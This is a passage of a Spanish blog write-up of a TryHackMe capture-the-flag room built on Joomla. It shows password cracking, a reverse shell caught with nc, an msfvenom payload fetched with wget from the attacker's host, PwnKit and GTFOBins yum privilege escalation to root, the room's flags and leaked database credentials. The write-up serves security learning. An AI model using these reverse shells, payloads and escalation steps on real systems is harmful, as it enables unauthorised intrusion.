+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">24</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>spiderman123     <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:47 DONE <span style="color:#f92672">(</span>2023-09-03 10:50<span style="color:#f92672">)</span> 0.02120g/s 994.1p/s 994.1c/s 994.1C/s 060494..setsuna
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><ul>
+<li>Intento subir fichero php para reverse shell sin exito. Buscando en internet encuentro <a href="https://www.hackingarticles.in/joomla-reverse-shell/">https://www.hackingarticles.in/joomla-reverse-shell/</a> asi que modifico un fichero php para lograrlo.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ rlwrap nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.14.50.184<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.53.147<span style="color:#f92672">]</span> <span style="color:#ae81ff">48678</span>
+</span></span><span style="display:flex;"><span>Linux dailybugle 3.10.0-1062.el7.x86_64 <span style="color:#75715e">#1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 05:14:22 up  2:06,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.03, 0.15
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>sh: no job control in this shell
+</span></span><span style="display:flex;"><span>sh-4.2$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>apache
+</span></span><span style="display:flex;"><span>sh-4.2$
+</span></span></code></pre></div><ul>
+<li>Estabilizo shell.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span></code></pre></div><ul>
+<li>En mi equipo, creo un payload con msfvenom para descargarlo en /tmp en la maquina remota.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST<span style="color:#f92672">=</span>10.x.x.x LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ul>
+<li>En maquina objetivo ejecuto:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.x.x.x:8080/shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">250</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: <span style="color:#e6db74">&#39;shell&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>100%<span style="color:#f92672">[======================================</span>&gt;<span style="color:#f92672">]</span> <span style="color:#ae81ff">250</span>         --.-K/s   in 0s      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2023-09-03 05:18:08 <span style="color:#f92672">(</span><span style="color:#ae81ff">954</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;shell&#39;</span> saved <span style="color:#f92672">[</span>250/250<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash-4.2$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>shell
+</span></span><span style="display:flex;"><span>bash-4.2$ chmod +x shell
+</span></span><span style="display:flex;"><span>chmod +x shell
+</span></span><span style="display:flex;"><span>bash-4.2$ ./shell
+</span></span></code></pre></div><ul>
+<li>Abro metasploit y selecciono multihandler exploit y  payload meterpreter/reverse_tcp</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload linux/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3045380</span> bytes<span style="color:#f92672">)</span> to 10.10.53.147
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.14.50.184:4444 -&gt; 10.10.53.147:34128<span style="color:#f92672">)</span> at 2023-09-03 11:22:51 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><ul>
+<li>Cargo el modulo local_exploit_suggester y lo ejecuto.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; search exploit suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                      ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 0, use <span style="color:#ae81ff">0</span> or use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; use <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                   Information            Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                   -----------            ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         meterpreter x64/linux  apache @ 10.10.53.147  10.14.50.184:4444 -&gt; 10.10.53.147:34128 <span style="color:#f92672">(</span>10.10.53.147<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.53.147 - Collecting local exploits <span style="color:#66d9ef">for</span> x64/linux...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.53.147 - <span style="color:#ae81ff">186</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/pkexec: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/su_login: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.53.147 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.23 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">63</span> / <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.53.147 - Valid modules <span style="color:#66d9ef">for</span> session 1:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                                Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                                -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/linux/local/network_manager_vpnc_username_priv_esc          Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>   exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.23 is vulnerable, but unable to determine
+</span></span></code></pre></div><ul>
+<li>Uso exploit cve_2021_4034_pwnkit_lpe_pkexec</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/cve_2021_4034_pwnkit_lpe_pkexec<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name          Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----          ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   PKEXEC_PATH                    no        The path to pkexec binary
+</span></span><span style="display:flex;"><span>   SESSION                        yes       The session to run this module on
+</span></span><span style="display:flex;"><span>   WRITABLE_DIR  /tmp             yes       A directory where we can write files
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   x86_64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/cve_2021_4034_pwnkit_lpe_pkexec<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Msf::OptionValidateError The following options failed to validate: SESSION
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/cve_2021_4034_pwnkit_lpe_pkexec<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/cve_2021_4034_pwnkit_lpe_pkexec<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Verify cleanup of /tmp/.tlhznymlpvc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing <span style="color:#e6db74">&#39;/tmp/.adasqfiitd/zraeisswkke/zraeisswkke.so&#39;</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">548</span> bytes<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Verify cleanup of /tmp/.adasqfiitd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3045380</span> bytes<span style="color:#f92672">)</span> to 10.10.53.147
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.adasqfiitd/zraeisswkke/zraeisswkke.so
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.adasqfiitd/.dnnzjbsapkm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted /tmp/.adasqfiitd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10. -&gt; 10.10.53.147:34132<span style="color:#f92672">)</span> at 2023-09-03 11:38:41 +0200
+</span></span></code></pre></div><ul>
+<li>Obtengo acceso root y busco flags.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; search -f user.txt
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> result...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path                     Size <span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span>  Modified <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>----                     ------------  --------------
+</span></span><span style="display:flex;"><span>/home/jjameson/user.txt  <span style="color:#ae81ff">33</span>            2019-12-16 01:47:48 +0100
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; search -f root.txt
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> result...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path            Size <span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span>  Modified <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>----            ------------  --------------
+</span></span><span style="display:flex;"><span>/root/root.txt  <span style="color:#ae81ff">33</span>            2019-12-16 01:47:19 +0100
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat /home/jjameson/user.txt
+</span></span><span style="display:flex;"><span>27a260fe3cba712cfdedb1c86d80442e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat /root/root.txt 
+</span></span><span style="display:flex;"><span>eec3d53292b1821868266858d7fa6f79
+</span></span></code></pre></div><ul>
+<li>La opción que proponía la sala era usar el binario yum, para ello habia que obtener acceslo como usuario local despues de revisar el fichero configuration.php en /var/www/html</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; cat configuration.php 
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>class JConfig <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	public $offline <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $offline_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $display_offline_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $offline_image <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $sitename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;The Daily Bugle&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $editor <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tinymce&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $captcha <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $list_limit <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;20&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $access <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $debug <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $debug_lang <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $dbtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nv5uz9r3ZEDzVjNu&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;joomla&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $dbprefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fb9j5_&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $live_site <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>	public $secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;UAMBRWzHO3oFPmVC&#39;</span>;
+</span></span></code></pre></div><ul>
+<li>Al logarse con esas credenciales, se buscaría la bandera de usuario y despues buscaría que binario puede ejecutar</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jjameson on dailybugle:
+</span></span><span style="display:flex;"><span>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, secure_path<span style="color:#f92672">=</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User jjameson may run the following commands on dailybugle:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/yum
+</span></span></code></pre></div><ul>
+<li>En <a href="https://gtfobins.github.io/gtfobins/yum/">https://gtfobins.github.io/gtfobins/yum/</a> viene el siguiente exploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>cat &gt;$TF/x<span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[main]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">plugins=1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">pluginpath=$TF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">pluginconfpath=$TF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt;$TF/y.conf<span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[main]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">enabled=1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt;$TF/y.py<span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import yum
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">requires_api_version=&#39;2.1&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def init_hook(conduit):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo yum -c $TF/x --enableplugin<span style="color:#f92672">=</span>y
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Una sala muy divertida con tématica de Spiderman, mi superhéroe favorito. Esta vez la sala tenía la etiqueta dificil, y la verdad es que he notado el pequeño salto de nivel. Me ha llevado unas 3 horas poder completarla, me encontré varios callejones sin salida con el SQLi de Joomla hasta que di con el script de python. Para conseguir las banderas usé directamente el exploit suggester de metasploit en vez de listar los binarios que podía ejecutar el usuario local (revisando la configuración del site en /var/www/html) y aprovechando el binario /bin/yum para obtener acceso privilegiado como sugiere la sala.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/dirb">#Dirb</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/gtfobins">#gtfobins</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/hard">#Hard</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/johntheripper">#johntheripper</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/joomla">#joomla</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/linux">#Linux</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/meterpreter">#Meterpreter</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/msfvenom">#msfvenom</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/mysql">#mysql</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/sqli">#sqli</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/sqlmap">#sqlmap</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/yum">#yum</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
